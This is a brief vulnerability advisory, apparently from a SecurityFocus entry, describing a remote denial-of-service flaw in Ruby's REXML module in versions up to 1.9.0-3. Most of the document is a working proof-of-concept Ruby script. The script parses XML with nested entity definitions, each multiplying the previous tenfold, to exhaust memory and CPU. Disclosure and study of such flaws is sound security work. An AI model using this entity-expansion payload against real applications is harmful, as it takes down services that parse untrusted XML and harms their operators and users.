source: http://www.securityfocus.com/bid/30802/info

Ruby is prone to a remote denial-of-service vulnerability in its REXML module.

Successful exploits may allow remote attackers to cause denial-of-service conditions in applications that use the vulnerable module.

Versions up to and including Ruby 1.9.0-3 are vulnerable. 

#!/usr/bin/env ruby
require 'rexml/document'

doc = REXML::Document.new(<<END)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE member [
  <!ENTITY a "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY b "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY c "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY d "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY e "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY f "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
  <!ENTITY g "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
]>
<member>
&a;
</member>
END

puts doc.root.text.size


